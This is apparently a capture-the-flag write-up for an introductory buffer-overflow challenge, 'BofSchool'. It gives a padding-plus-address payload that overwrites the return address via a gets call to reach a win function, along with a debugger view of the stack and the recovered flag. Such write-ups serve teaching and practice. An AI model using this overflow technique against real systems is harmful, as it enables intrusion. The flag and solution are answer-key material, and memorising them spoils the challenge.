# BofSchool
Exploitation

## Challenge 

DESCRIPTION
Welcome to Pwn101.

stty -icanon -echo ; nc chals.whitehacks.ctf.sg 12001; stty sane

Controls:

q           - Quit the program
[Backspace] - Delete character
[Enter]     - Send payload

Use `\xXX` to send hex encoded characters (useful for unprintable characters), e.g. "\x44\x41\x42" is equivalent to "DAB"
Author: lord_idiot

## Solution

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x66\x05\x40\x00\x00\x00\x00\x00

It shows a GDB for us

	┌ Stack ─────────────────────────────────────────────┐┌ Disassembly ─────────────────────────────────────────────────┐
	│                                                    ││                                                              │
	│ 0x00007fffffffd770|+0x00: 61 61 61 61 61 61 61 61  ││ win:                                                         │
	│ 0x00007fffffffd778|+0x08: 61 61 61 61 61 61 61 61  ││  0x0000000000400566 <+0> :    push   rbp                     │
	│ 0x00007fffffffd780|+0x10: 61 61 61 61 61 61 61 61  ││  0x0000000000400567 <+1> :    mov    rbp,rsp                 │
	│ 0x00007fffffffd788|+0x18: 61 61 61 61 61 61 61 61  ││  0x000000000040056a <+4> :    mov    edi,0x601060 <flag>     │
	│ 0x00007fffffffd790|+0x20: 61 61 61 61 61 61 61 61  ││  0x000000000040056f <+9> :    call   0x400430 <puts@plt>     │
	│ 0x00007fffffffd798|+0x28:┌ Result ────────────────────────────────────────┐+14>:    nop                            │
	│ 0x00007fffffffd7a0|+0x30:│                                                │+15>:    pop    rbp                     │
	│ 0x00007fffffffd7a8|+0x38:│ Congrats! You got the flag :D                  │+16>:    ret                            │
	│ 0x00007fffffffd7b0|+0x40:│   WH2020{A_for_pwning!}                        │                                        │
	│ 0x00007fffffffd7b8|+0x48:└────────────────────────────────────────────────┘                                        │
	│ 0x00007fffffffd7c0|+0x50: 00 00 00 00 00 00 00 00  ││  0x0000000000400577 <+0> :    push   rbp                     │
	│                                                    ││  0x0000000000400578 <+1> :    mov    rbp,rsp                 │
	└────────────────────────────────────────────────────┘│  0x000000000040057b <+4> :    sub    rsp,0x20                │
	┌ Registers ─────────────────────────────────────────┐│  0x000000000040057f <+8> :    lea    rax,[rbp-0x20]          │
	│                                                    ││  0x0000000000400583 <+12>:    mov    rdi,rax                 │
	│ rip:  0x0000000000400566                           ││  0x0000000000400586 <+15>:    mov    eax,0x0                 │
	│ rsp:  0x00007fffffffd798                           ││  0x000000000040058b <+20>:    call   0x400450 <gets@plt>     │
	│ rbp:  0x00007fffffffd798                           ││  0x0000000000400590 <+25>:    mov    eax,0x0                 │
	│ rdi:  0x0000000000601060                           ││  0x0000000000400595 <+30>:    leave                          │
	│ rax:  0x0000000000000000                           ││  0x0000000000400596 <+31>:    ret                            │
	│                                                    ││                                                              │
	└────────────────────────────────────────────────────┘└──────────────────────────────────────────────────────────────┘
	┌ Input ─────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
	│ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x66\x05\x40\x00\x00\x00\x00\x00                                           │
	└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

## Flag

	WH2020{A_for_pwning!}